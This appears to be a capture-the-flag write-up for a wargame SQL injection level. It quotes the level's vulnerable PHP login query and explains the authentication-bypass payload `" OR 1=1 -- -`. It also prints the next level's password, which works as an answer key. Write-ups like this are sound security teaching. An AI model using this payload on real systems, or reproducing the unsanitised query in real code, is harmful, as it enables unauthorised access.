## Level Overview

The application presents a login form that validates credentials against a database.
The objective is to bypass authentication and retrieve the password for the next level by exploiting a SQL injection vulnerability.

## Source Code Analysis

The login query is constructed as follows:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
User input is directly concatenated into the SQL query without sanitization or parameterization.

## Vulnerability

This implementation is vulnerable to **SQL Injection (SQLi)**, a vulnerability where:

```text
User input → inserted into SQL query → alters query structure → unintended execution
```

Attackers can manipulate queries to:
- bypass authentication  
- extract data  
- modify database contents

The application expects input within quoted strings:

```sql
WHERE username="input" AND password="input"
```

By injecting special characters, an attacker can:

1. close the string
2. inject arbitrary logic
3. comment out the remainder

### Payload

```text
" OR 1=1 -- -
```

## Execution Flow

The query becomes:

```sql
SELECT * FROM users 
WHERE username="" OR 1=1 -- - " AND password=""
```

## Explanation

* `"` → closes the original string
* `OR 1=1` → always true condition
* `-- -` → comments out the rest of the query

Result:

```sql
WHERE TRUE
```

The database returns at least one row, and authentication succeeds.

## Result

The application displays:

```text
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx.
```
